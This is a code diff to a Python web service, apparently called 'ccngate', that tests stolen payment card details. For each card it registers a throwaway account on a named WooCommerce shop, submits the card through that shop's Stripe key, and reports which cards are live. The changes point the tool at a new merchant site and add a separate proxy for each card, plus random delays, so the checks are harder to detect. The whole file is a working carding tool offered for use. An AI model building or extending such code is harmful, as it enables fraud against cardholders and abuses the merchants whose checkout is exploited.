@@ -1,4 +1,3 @@
-# app.py
 import os
 import uuid
 import string
@@ -57,6 +56,9 @@ def gets(s, start, end):
     except ValueError:
         return None
 
+def generate_user_agent():
+    return 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36'
+
 async def get_session(proxy_line: str):
     """
     Creates a new AsyncClient with proxy configured.
@@ -66,14 +68,9 @@ async def get_session(proxy_line: str):
     if "session-RANDOMID" in user:
         user = user.replace("session-RANDOMID", f"session-{uuid.uuid4().hex}")
     proxy_url = f"http://{user}:{pwd}@{host}:{port}"
-
-    proxies = {
-        "http://": proxy_url,
-        "https://": proxy_url
-    }
-
+    
     session = httpx.AsyncClient(
-        proxies=proxies,
+        proxy=proxy_url,
         timeout=httpx.Timeout(60.0),
         trust_env=False,
         follow_redirects=True
@@ -81,39 +78,75 @@ async def get_session(proxy_line: str):
     return session, proxy_url
 
 # ---------------------------
-# Core Payment Function
+# Core Payment Function (Updated with new site data)
 # ---------------------------
 async def create_payment_method(fullz: str, session: httpx.AsyncClient, proxy_url: str):
     try:
         cc, mes, ano, cvv = fullz.split("|")
-        user = "cristniki" + str(random.randint(1000, 999999))
+        user = "cristniki" + str(random.randint(9999, 574545))
         mail = f"{user}@gmail.com"
-
+        
         headers = {
             "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
             "accept-language": "en-US,en;q=0.9",
-            "user-agent": UserAgent().random,
+            "user-agent": generate_user_agent(),
         }
 
-        # STEP 1: register nonce
         register_nonce = generate_nonce()
-        response = await session.get("https://www.biometricsupply.com/my-account/", headers=headers)
-        register1_nonce = gets(response.text, 'id="woocommerce-register-nonce" name="woocommerce-register-nonce" value="', '" />')
 
-        # STEP 2: register user
+        # STEP 1: get nonce from greenkidcrafts.com
+        response = await session.get(
+            "https://www.greenkidcrafts.com/my-account/", headers=headers
+        )
+        register1_nonce = gets(
+            response.text,
+            'id="woocommerce-register-nonce" name="woocommerce-register-nonce" value="',
+            '" />',
+        )
+
+        # STEP 2: register user with updated data
         data = {
-            "email": mail,
-            "woocommerce-register-nonce": register1_nonce,
-            "_wp_http_referer": "/my-account/",
-            "register": "Register",
+            'email': mail,
+            'mailchimp_woocommerce_newsletter': '1',
+            'wc_order_attribution_source_type': 'typein',
+            'wc_order_attribution_referrer': '(none)',
+            'wc_order_attribution_utm_campaign': '(none)',
+            'wc_order_attribution_utm_source': '(direct)',
+            'wc_order_attribution_utm_medium': '(none)',
+            'wc_order_attribution_utm_content': '(none)',
+            'wc_order_attribution_utm_id': '(none)',
+            'wc_order_attribution_utm_term': '(none)',
+            'wc_order_attribution_utm_source_platform': '(none)',
+            'wc_order_attribution_utm_creative_format': '(none)',
+            'wc_order_attribution_utm_marketing_tactic': '(none)',
+            'wc_order_attribution_session_entry': 'https://www.greenkidcrafts.com/my-account/',
+            'wc_order_attribution_session_start_time': '2025-09-15 12:54:53',
+            'wc_order_attribution_session_pages': '6',
+            'wc_order_attribution_session_count': '1',
+            'wc_order_attribution_user_agent': generate_user_agent(),
+            'woocommerce-register-nonce': register_nonce,
+            '_wp_http_referer': '/my-account/',
+            'register': 'Register',
         }
-        await session.post("https://www.biometricsupply.com/my-account/", headers=headers, data=data)
+        await session.post(
+            "https://www.greenkidcrafts.com/my-account/",
+            headers=headers,
+            data=data,
+        )
 
         # STEP 3: add payment page
-        response = await session.get("https://www.biometricsupply.com/my-account/add-payment-method/", headers=headers)
-        setup_nonce = gets(response.text, '"createAndConfirmSetupIntentNonce":"', '","')
+        response = await session.get(
+            "https://www.greenkidcrafts.com/my-account/add-payment-method/",
+            headers=headers,
+        )
+        setup_nonce0 = gets(
+            response.text, '"createSetupIntentNonce":"', '","'
+        )
+        setup_nonce = gets(
+            response.text, '"createAndConfirmSetupIntentNonce":"', '","'
+        )
 
-        # STEP 4: Stripe payment method
+        # STEP 4: Stripe payment method with updated key
         data = {
             "type": "card",
             "card[number]": cc,
@@ -121,9 +154,11 @@ async def create_payment_method(fullz: str, session: httpx.AsyncClient, proxy_ur
             "card[exp_month]": mes,
             "card[exp_year]": ano,
             "billing_details[address][country]": "PK",
-            "key": "pk_live_51JeGcZCscllU4UB1q4R6Bz6qN5slFTiaNyC8eP5CdU6f3OcADOJIyI2lrTYcQsx9nOsHBdRdLAuRhO9mWFARqJxl00JcwCqa0V",
+            "key": "pk_live_UdiYedvkJma7qlJ03Y7zYVAN00tSNEOnQE",
         }
-        resp = await session.post("https://api.stripe.com/v1/payment_methods", headers=headers, data=data)
+        resp = await session.post(
+            "https://api.stripe.com/v1/payment_methods", headers=headers, data=data
+        )
 
         try:
             pm_id = resp.json().get("id")
@@ -135,14 +170,23 @@ async def create_payment_method(fullz: str, session: httpx.AsyncClient, proxy_ur
                 "proxy_used": proxy_url
             }
 
+        # Updated final request with new endpoint and parameters
+        params = {
+            'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent',
+        }
+
         data = {
-            'action': 'wc_stripe_create_and_confirm_setup_intent',
+            'action': 'create_and_confirm_setup_intent',
             'wc-stripe-payment-method': pm_id,
             'wc-stripe-payment-type': 'card',
             '_ajax_nonce': setup_nonce,
         }
-        
-        final = await session.post("https://www.biometricsupply.com/wp-admin/admin-ajax.php", headers=headers, data=data)
+        final = await session.post(
+            "https://www.greenkidcrafts.com/",
+            params=params,
+            headers=headers,
+            data=data,
+        )
 
         # RESPONSE
         try:
@@ -168,8 +212,6 @@ async def create_payment_method(fullz: str, session: httpx.AsyncClient, proxy_ur
                 return {"card": fullz, "status": "declined", "message": "Card Declined", "proxy_used": proxy_url}
             elif error_message == "Invalid account.":
                 return {"card": fullz, "status": "declined", "message": "Invalid Account", "proxy_used": proxy_url}
-            elif error_message == "Invalid account.":
-                return {"card": fullz, "status": "declined", "message": "Invalid Account", "proxy_used": proxy_url}
             elif error_message == "502 Zone has reached usage limit":
                 return {"card": fullz, "status": "error", "message": "Proxy Error", "proxy_used": proxy_url}
             elif error_message == "An error occurred while processing your card. Try again in a little bit.":
@@ -193,7 +235,7 @@ async def create_payment_method(fullz: str, session: httpx.AsyncClient, proxy_ur
         return {"card": fullz, "status": "error", "message": str(e), "proxy_used": proxy_url}
 
 # ---------------------------
-# API ENDPOINTS
+# API ENDPOINTS (Updated to use unique proxy per card)
 # ---------------------------
 @app.get("/")
 async def root():
@@ -202,29 +244,47 @@ async def root():
 @app.get("/ccngate/{cards}", response_model=List[CCResponse])
 async def check_cards_get(cards: str):
     card_list = cards.split(",")[:5]
-    proxy_line = random.choice(load_proxies())
-    session, proxy_url = await get_session(proxy_line)
-
+    proxies = load_proxies()
+    
     results = []
-    for card in card_list:
+    for i, card in enumerate(card_list):
         if card.strip():
-            res = await create_payment_method(card.strip(), session, proxy_url)
-            results.append(res)
-    await session.aclose()
+            # Use a different proxy for each card
+            proxy_line = proxies[i % len(proxies)]
+            session, proxy_url = await get_session(proxy_line)
+            
+            try:
+                res = await create_payment_method(card.strip(), session, proxy_url)
+                results.append(res)
+            finally:
+                await session.aclose()
+                
+            # Add small delay between cards
+            await asyncio.sleep(random.uniform(1.5, 3.5))
+    
     return results
 
 @app.post("/ccngate", response_model=List[CCResponse])
 async def check_cards_post(request: CCRequest):
     card_list = request.cards.split(",")[:5]
-    proxy_line = random.choice(load_proxies())
-    session, proxy_url = await get_session(proxy_line)
-
+    proxies = load_proxies()
+    
     results = []
-    for card in card_list:
+    for i, card in enumerate(card_list):
         if card.strip():
-            res = await create_payment_method(card.strip(), session, proxy_url)
-            results.append(res)
-    await session.aclose()
+            # Use a different proxy for each card
+            proxy_line = proxies[i % len(proxies)]
+            session, proxy_url = await get_session(proxy_line)
+            
+            try:
+                res = await create_payment_method(card.strip(), session, proxy_url)
+                results.append(res)
+            finally:
+                await session.aclose()
+                
+            # Add small delay between cards
+            await asyncio.sleep(random.uniform(1.5, 3.5))
+    
     return results
 
 # ---------------------------
